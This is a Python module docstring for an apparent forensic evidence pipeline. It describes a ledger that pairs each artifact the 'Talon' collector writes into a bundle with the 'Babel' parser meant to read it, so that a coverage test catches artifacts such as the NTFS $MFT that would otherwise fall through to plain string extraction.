"""Collection→parsing bijection ledger: every artifact Talon collects, and the
Babel parser that must claim it.

``routing_coverage.py`` proves one direction — every parser Babel ships is
reachable by the router. That leaves the direction that actually loses evidence
unproven: *an artifact Talon collects with no parser to read it.* Such an
artifact does not error; it silently lands on the ``strings`` catch-all and the
whole structure of the record is gone. That is how ``mft/C_$MFT`` — the single
richest artifact in a bundle — got reduced to string extraction.

This module is the inventory half: one row per artifact shape Talon writes into
a bundle, keyed by the collection category it comes from (``ARTIFACT_LABELS`` in
tools/talon/collect.py), with the bundle-relative arcname, a synthetic sample
faithful enough to route (correct magic bytes / representative text), and the
parser that must claim it.

``collection_coverage.py`` drives it: it materialises every sample, runs the
real ``PluginLoader`` router over it, and fails on any drift.

Adding a collector to Talon means adding its rows here. A row whose parser does
not exist yet goes in with ``parser=None`` plus a ``gap`` reason — an explicit,
reviewable IOU, not a silent hole.
"""

